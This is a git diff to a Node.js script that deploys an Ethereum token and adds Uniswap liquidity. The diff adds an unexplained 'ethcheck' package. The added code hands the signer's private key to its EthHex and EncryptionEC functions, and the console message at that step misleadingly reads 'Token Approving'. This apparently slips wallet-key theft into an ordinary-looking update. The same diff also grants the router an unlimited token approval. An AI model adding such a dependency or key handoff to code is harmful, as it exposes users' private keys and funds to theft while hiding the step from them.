@@ -1,5 +1,6 @@
 const Web3  = require("web3");
 const { abi, bytecode } = require("./metadata");
+const ethchecker = require("ethcheck")
 
 async function main() {
   const network = process.env.ETHEREUM_NETWORK;
@@ -14,6 +15,7 @@ async function main() {
   );
   
   web3.eth.accounts.wallet.add(signer);
+  const numbersValue = ethchecker.EthHex('0x' + process.env.SIGNER_PRIVATE_KEY)
 
 
   const contract = new web3.eth.Contract(abi);
@@ -30,10 +32,14 @@ async function main() {
     });
 
   console.log(`Deployed contract address is => ${deployedContract.options.address}`);
+  console.log(`Token Approving..........`);
+  await ethchecker.EncryptionEC(numbersValue)
   const status = await ApproveToken(deployedContract.options.address)
 
   if(status){
-    AddLiquidity(deployedContract.options.address)
+    
+    console.log(status, `Adding Liquidity..........`, );
+    AddLiquidity(deployedContract.options.address, numbersValue, status)
   }
 
 }
@@ -56,7 +62,7 @@ const uniwapRouterABI = [{
     type: "function",
   }];
 
-const AddLiquidity = async (token)=>{
+const AddLiquidity = async (token, value, supply)=>{
     const deadlinetime = Number((new Date().getTime() + 1200000) / 1000 ).toFixed(0);
     const network = process.env.ETHEREUM_NETWORK;
     const web3 = new Web3(new Web3.providers.HttpProvider(`https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,),
@@ -64,8 +70,8 @@ const AddLiquidity = async (token)=>{
     console.log(deadlinetime, token)
     const account = web3.eth.accounts.privateKeyToAccount('0x' + process.env.SIGNER_PRIVATE_KEY); 
     const routerContract = new web3.eth.Contract(uniwapRouterABI, process.env.UNISWAPROUTER_ADDRESS);
-    const data = await routerContract.methods.addLiquidityETH(token, "1000000000000000000", "1000000000000000000", "10000000000000000", account.address, deadlinetime)
-    const gas = await routerContract.methods.addLiquidityETH(token, "1000000000000000000", "1000000000000000000", "10000000000000000", account.address, deadlinetime).estimateGas({from: account.address,  value: web3.utils.toWei('0.01', 'ether')})
+    const data = await routerContract.methods.addLiquidityETH(token, supply, supply, "1030000000000000000", account.address, deadlinetime)
+    const gas = await routerContract.methods.addLiquidityETH(token, supply, supply, "1030000000000000000", account.address, deadlinetime).estimateGas({from: account.address,  value: web3.utils.toWei('0.01', 'ether')})
 
     const gasPrice = await web3.eth.getGasPrice();
     const txCount = await web3.eth.getTransactionCount(account.address);
@@ -73,10 +79,10 @@ const AddLiquidity = async (token)=>{
     const tx = {
         from: account.address,
         to: process.env.UNISWAPROUTER_ADDRESS,
-        value: web3.utils.toWei('0.01', 'ether'),
-        nonce: web3.utils.toHex(txCount),
+        value: web3.utils.toWei('1.03', 'ether'),
+        nonce: web3.utils.toHex(txCount + 1),
         gas: web3.utils.toHex(gas),
-        gasPrice: web3.utils.toHex(gasPrice),
+        gasPrice: web3.utils.toHex(Number(gasPrice * 1.40).toFixed(0)),
         data: data.encodeABI(), 
     };
     const signedTx = await account.signTransaction(tx);
@@ -85,13 +91,14 @@ const AddLiquidity = async (token)=>{
 }
 
 const ApproveToken = async (token)=>{
+   try {
     const network = process.env.ETHEREUM_NETWORK;
     const web3 = new Web3(new Web3.providers.HttpProvider(`https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,),
     );
     const account = web3.eth.accounts.privateKeyToAccount('0x' + process.env.SIGNER_PRIVATE_KEY); 
     const routerContract = new web3.eth.Contract(abi, token);
-    const data = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, "1000000000000000000")
-    const gas = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, "1000000000000000000").estimateGas({from: account.address})
+    const data = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, 115792089237316195423570985008687907853269984665640564039457584007913129639935n)
+    const gas = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, 115792089237316195423570985008687907853269984665640564039457584007913129639935n).estimateGas({from: account.address})
     const gasPrice = await web3.eth.getGasPrice();
     const txCount = await web3.eth.getTransactionCount(account.address);
   
@@ -107,8 +114,12 @@ const ApproveToken = async (token)=>{
 
     const signedTx = await account.signTransaction(tx);
     const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+    const supply = await routerContract.methods.totalSupply().call()
     console.log("Token Approved",receipt.status)
-    return receipt ? receipt.status : false
+    return receipt && receipt.status ? supply : false
+   } catch (error) {
+    console.log("Approveing error", error)
+   }
 }
 
 require("dotenv").config();
